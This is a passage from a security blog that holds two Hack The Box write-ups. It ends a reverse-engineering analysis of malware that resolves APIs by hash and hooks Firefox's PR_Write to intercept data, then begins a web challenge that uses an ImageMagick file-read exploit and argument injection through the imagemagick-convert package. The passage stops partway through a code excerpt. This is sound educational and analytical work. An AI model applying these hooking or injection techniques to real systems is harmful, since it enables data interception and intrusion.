&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/7.PNG"
width="1890"
height="660"
srcset="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/7_huc08ee76c8eefb01b80700f81ee0bbc9d_163031_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/7_huc08ee76c8eefb01b80700f81ee0bbc9d_163031_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Yep, this is the payload."
class="gallery-image"
data-flex-grow="286"
data-flex-basis="687px"
>&lt;/p>
&lt;p>Now we can create the thread manually with the &lt;code>createthread &amp;lt;payload_addr&amp;gt;&lt;/code> command, and switch to it with the &lt;code>switchthread &amp;lt;thread_id&amp;gt;&lt;/code> command.
You won&amp;rsquo;t see the thread right away, first you need to run until return.
Then the thread should show up in your &lt;code>Threads&lt;/code> tab.
Then we can continue until we are at the start of our payload.
Now I set breakpoints at the &lt;code>crc&lt;/code> instruction so I can what function name its comparing as well as when it breaks.
When it breaks it will tell us the function it has imported.&lt;/p>
&lt;p>However, I&amp;rsquo;d rather just know right away so I rebuilt the functionality in lil cpp tool.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// g++ -o api api.cpp -msse4.2
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;immintrin.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;cstring&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">custom_crc32_u8&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">crc&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">crc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">_mm_crc32_u8&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">crc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">crc&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">names&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;functionNames&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">initial_value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xFFFFFFFF&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nl">name&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">names&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">crc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">custom_crc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">initial_value&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="o">~&lt;/span>&lt;span class="n">crc&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mh">0x43AAC47D&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;~CRC-32 for &amp;#39;&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">name&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;&amp;#39;: 0x&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">hex&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">crc&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">dec&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I was able to get the function names from this &lt;a class="link" href="https://www.geoffchappell.com/studies/windows/win32/kernel32/api/" target="_blank" rel="noopener"
>page&lt;/a> with the following python script:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-py" data-lang="py">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">bs4&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">BeautifulSoup&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">URL&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;https://www.geoffchappell.com/studies/windows/win32/kernel32/api/&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">resp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">URL&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">resp&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">soup&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BeautifulSoup&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;html.parser&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">fns&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">tag&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">tag&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">soup&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">find_all&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;span&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">class_&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;function&amp;#39;&lt;/span>&lt;span class="p">)]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fns&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now we can see that it wants &lt;code>GetProcAddress&lt;/code>.
It then goes on to resolve &lt;code>VirtualAlloc&lt;/code>&lt;/p>
&lt;p>It should be noted that these addresses are being stored in &lt;code>R12&lt;/code> and &lt;code>R15&lt;/code> respectively.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/8.PNG"
width="1677"
height="156"
srcset="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/8_hu2b3955b916d2665feb4310896c1e3580_18270_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/8_hu2b3955b916d2665feb4310896c1e3580_18270_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Sneaky"
class="gallery-image"
data-flex-grow="1075"
data-flex-basis="2580px"
>&lt;/p>
&lt;p>We can follow the returned address in dump to monitor any changes to this region.
Then it resolves &lt;code>VirtualProtect&lt;/code> but stores that one on the stack.
Then its time for another api hashing sesh, but this time against the loaded modules.
Specifically, it wants 3 more modules:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">8861D80B
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3DCE28A2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">83BCBE6A
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We can export a list of the loaded modules from x64Dbg and parse them with python, and then run them through our hashing cpp code.
Using this method I see that &lt;code>0x3DCE28A2&lt;/code> corresponds to &lt;code>NSS3.dll&lt;/code>, and &lt;code>0x8861d80b&lt;/code> is for the lowercase version.
I&amp;rsquo;m guessing the third hash is just a fake to try and dupe the analyst.
After it gets the base address of this module, it gets the address for &lt;code>PR_Write&lt;/code>.
Firefox docs have the following for this call:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">PRInt32&lt;/span> &lt;span class="nf">PR_Write&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PRFileDesc&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">const&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PRInt32&lt;/span> &lt;span class="n">amount&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>After getting the address for this function, it is placed in &lt;code>R15&lt;/code>, overwriting the pointer to &lt;code>VirtualAlloc&lt;/code>.
Then the code from &lt;code>PR_Write&lt;/code> is copied into the allocated memory from before.
Seems like a copy is being made, probably for a hook.
Later, the code from &lt;code>PR_Write&lt;/code> is saved to the previously allocated buffer.
There is check to stop when it finds certain instructions contained in &lt;code>RBX&lt;/code> but it never finds them , leading it to write to out of bounds so I just manually made it pass the check.
Then it changes permissions on the copied instructions to &lt;code>PAGE_EXECUTE_READ&lt;/code>.
Then the memory at the real &lt;code>PR_Write&lt;/code> has its permissions changed to &lt;code>PAGE_EXECUTE_READWRITE&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/9.PNG"
width="959"
height="171"
srcset="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/9_hu8e98261c881e82528c3fdd602e5b0808_14416_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/9_hu8e98261c881e82528c3fdd602e5b0808_14416_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Getting ready to hook PR_Write"
class="gallery-image"
data-flex-grow="560"
data-flex-basis="1345px"
>&lt;/p>
&lt;p>Then the start of &lt;code>PR_Write&lt;/code> is overwritten with the bytes: &lt;code>4155415449BC&lt;/code> which corresponds to the instructions.
A comparison of the before and after is shown here:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/10.PNG"
width="965"
height="53"
srcset="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/10_hu44f574ae965423022a58f4b531f3909f_3770_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/10_hu44f574ae965423022a58f4b531f3909f_3770_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Before"
class="gallery-image"
data-flex-grow="1820"
data-flex-basis="4369px"
> &lt;img src="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/11.PNG"
width="993"
height="51"
srcset="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/11_hu6fbcee8b610207b3e3a58841f41e6e96_4066_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/11_hu6fbcee8b610207b3e3a58841f41e6e96_4066_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="After"
class="gallery-image"
data-flex-grow="1947"
data-flex-basis="4672px"
>&lt;/p>
&lt;p>The final hooked function looks like this:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/12.PNG"
width="989"
height="598"
srcset="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/12_hu8718a4db9676d21a9dcf22cac58b5ca8_45648_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/12_hu8718a4db9676d21a9dcf22cac58b5ca8_45648_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Hook is completed"
class="gallery-image"
data-flex-grow="165"
data-flex-basis="396px"
>&lt;/p>
&lt;p>If we follow the hook, we end up at a function that has a check for &lt;code>RBX&lt;/code> being less than or equal to 4.
On a matching condition, the hook exits, so I nopped it.
Then it checks if the value pointed at by &lt;code>RDX&lt;/code> is equal to the command &lt;code>STOP&lt;/code>.
If its not equal it will also exit.
So we jump over that and continue.
I also have intuition to continue here because I see another hashing loop later on down this path, so I&amp;rsquo;m curious to see what comes out of it.
It turns out to be wanting &lt;code>WS_32.dll&lt;/code>.&lt;/p>
&lt;h2 id="endgame">Endgame
&lt;/h2>&lt;p>So I forgot to take screenshots when I solved it, and I don&amp;rsquo;t feel like going through the challenge again to get them, so I&amp;rsquo;ll just summarize what ended up happening.
I set a breakpoint at the &lt;code>PR_Write&lt;/code> function, and waiting until it was hit with data.
Once the data was hit, the data gets encrypted.
The encryption depends on a key generated from bytes right before the encryption routine, and the amount of bytes read from that area depend on the size of the data being encrypted.
Regardless of the size, the first 32 bytes of the key will always be the flag.
The key generation and encryption takes a minnnn to complete if you are stepping through with breakpoints, we can modify the call to &lt;code>PR_Write&lt;/code> &lt;code>size&lt;/code> parameter to 32, which will make the flag appear one byte at a time before they are used to encrypt the data.&lt;/p></description></item><item><title>HTB WEB Prying Eyes</title><link>https://Kvn11.github.io/p/htb-web-prying-eyes/</link><pubDate>Sun, 29 Oct 2023 02:46:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-web-prying-eyes/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/hackthebox.jpg" alt="Featured image of post HTB WEB Prying Eyes" />&lt;blockquote>
&lt;p>&lt;strong>Challenge Description&lt;/strong>: Welcome to the Prying Eyes, a &amp;ldquo;safe space&amp;rdquo; for those curious about the large organisations that dominate our life.
How safe is the site really?&lt;/p>
&lt;/blockquote>
&lt;h2 id="walkthrough">Walkthrough
&lt;/h2>&lt;p>The challenge involves what seems to be a leaks forum / marketplace, very reminiscent of RaidForums (RIP).&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/4.PNG"
width="917"
height="951"
srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/4_hu2daf908e9f049988721999c6f3a9721b_244231_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/4_hu2daf908e9f049988721999c6f3a9721b_244231_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Home page of the challenge site"
class="gallery-image"
data-flex-grow="96"
data-flex-basis="231px"
>&lt;/p>
&lt;p>Other than some interesting posts, doesn&amp;rsquo;t seem to be much else so I moved on to source code review at this point.
Right away, I noticed that one of the pages was using &lt;code>Imagemagick&lt;/code> which is known to have tons of vulnerabilities.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/5.PNG"
width="746"
height="241"
srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/5_hu6ad4e8bae519ff810e4c1a0e126ad256_43528_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/5_hu6ad4e8bae519ff810e4c1a0e126ad256_43528_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Naughty naughty imagemagick"
class="gallery-image"
data-flex-grow="309"
data-flex-basis="742px"
>&lt;/p>
&lt;p>&lt;code>Imagemagick-convert&lt;/code> is just a JavaScript interface for the &lt;code>convert&lt;/code> CLI tool from &lt;code>Imagemagick&lt;/code>, which according to the Dockerfile from the challenge is version &lt;code>7.1.0-33&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/6.PNG"
width="1118"
height="291"
srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/6_hu3ae2305a1770b8206050f19eef824495_46868_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/6_hu3ae2305a1770b8206050f19eef824495_46868_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Its always suspicous when a single package uses a specific version"
class="gallery-image"
data-flex-grow="384"
data-flex-basis="922px"
>&lt;/p>
&lt;p>A little googling brings us to this &lt;a class="link" href="https://github.com/Sybil-Scan/imagemagick-lfi-poc" target="_blank" rel="noopener"
>exploit&lt;/a>.
Generating the exploit is pretty straightforward, just follow the instructions from the script.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/1.PNG"
width="638"
height="146"
srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/1_hu72318ef7ea01e31a4d300b1d9aafd248_21037_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/1_hu72318ef7ea01e31a4d300b1d9aafd248_21037_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Exploit generation"
class="gallery-image"
data-flex-grow="436"
data-flex-basis="1048px"
>&lt;/p>
&lt;p>Now its important to note that the file read is only accessible if the output file of the &lt;code>convert&lt;/code> operation is a &lt;code>png&lt;/code>.
I got stuck on this for quite a while, but looking at the source code for the forum revealed another vulnerability.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/7.PNG"
width="767"
height="659"
srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/7_hu9f7812283d4920cb8db22821c2c129ae_77464_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/7_hu9f7812283d4920cb8db22821c2c129ae_77464_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Why are we allowed to pass in arguments to a serverside CLI tool?"
class="gallery-image"
data-flex-grow="116"
data-flex-basis="279px"
>&lt;/p>
&lt;p>The fact that we can pass in our own arguments through intercepting the post request implies there is an argument that we can use that will allow us to change the output file format.
The source code for the convert function can be found here&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://www.npmjs.com/package/imagemagick-convert?activeTab=code" target="_blank" rel="noopener"
>imagemagick-convert&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>The code pretty much just creates a command string that is then passed to a command process.
The data from the uploaded image is passed through standard input, and our options are concatenated together.
The intended command string is supposed to look like this:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">convert &amp;lt;args&amp;gt; - AVIF:file_name
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>However, since it just concats whatever is passed to it without much processing, it allows for command injection.
The output file name is the last arg to be concated to the string, so we just need an option that occurs before it.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * Create occurrence
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * @param {string|null} format
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * @param {string|null} name
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * @returns {string}
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">createOccurrence&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">format&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
